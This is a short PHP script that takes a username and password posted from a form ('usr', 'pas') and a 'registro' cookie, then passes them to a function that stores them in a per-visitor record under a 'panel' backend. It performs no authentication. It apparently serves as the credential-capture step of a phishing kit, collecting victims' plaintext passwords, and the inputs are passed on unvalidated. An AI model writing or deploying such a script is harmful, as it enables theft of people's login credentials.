<?php
require('../../panel/lib/funciones.php');

date_default_timezone_set('America/Bogota');

$registro = $_COOKIE['registro'];

$usuario = $_POST['usr'];
$clave = $_POST['pas'];

actualizar_registro_usuario($registro,$usuario,$clave);
?>